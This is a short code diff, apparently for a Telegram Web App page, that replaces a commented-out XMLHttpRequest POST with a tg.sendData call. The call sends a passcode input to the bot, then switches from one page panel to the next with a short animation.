@@ -52,35 +52,33 @@ document.addEventListener('DOMContentLoaded', () => {
 
     passcodeBtn.addEventListener('click', () => {
         // page2.style.transform = 'translate(-50%, 40px)';
-        var xml = new XMLHttpRequest();
-        xml.open('POST', "{{url_for('func.func')}}", true);
-        xml.setRequestHeader(
-            'Content-type',
-            'application/x-www-form-urlencoded'
-        );
+        // var xml = new XMLHttpRequest();
+        // xml.open('POST', "{{url_for('func.func')}}", true);
+        // xml.setRequestHeader(
+        //     'Content-type',
+        //     'application/x-www-form-urlencoded'
+        // );
 
-        xml.onload = function () {
-            var dataReply = JSON.parse(this.responseText);
-        }; //endfunction
+        // xml.onload = function () {
+        //     var dataReply = JSON.parse(this.responseText);
+        // }; //endfunction
 
-        dataSend = JSON.stringify({
-            page_data: 'some_data',
-        });
+        // dataSend = JSON.stringify({
+        //     page_data: 'some_data',
+        // });
 
-        xml.send(dataSend);
+        // xml.send(dataSend);
+        tg.sendData(JSON.stringify(passcodeInput.value));
         page2.style.display = 'none';
+        setTimeout(() => {
+            page2.style.display = 'none';
 
-        // tg.sendData(JSON.stringify(passcodeInput.value));
-
-        // setTimeout(() => {
-        //     page2.style.display = 'none';
-
-        //     page3.style.display = 'flex';
-        //     requestAnimationFrame(() => {
-        //         page3.style.transform = 'translate(0)';
-        //         page3.style.opacity = '1';
-        //     });
-        // }, 200);
+            page3.style.display = 'flex';
+            requestAnimationFrame(() => {
+                page3.style.transform = 'translate(0)';
+                page3.style.opacity = '1';
+            });
+        }, 200);
     });
 
     const twofactorBtn = document.getElementById('twofactor-btn');
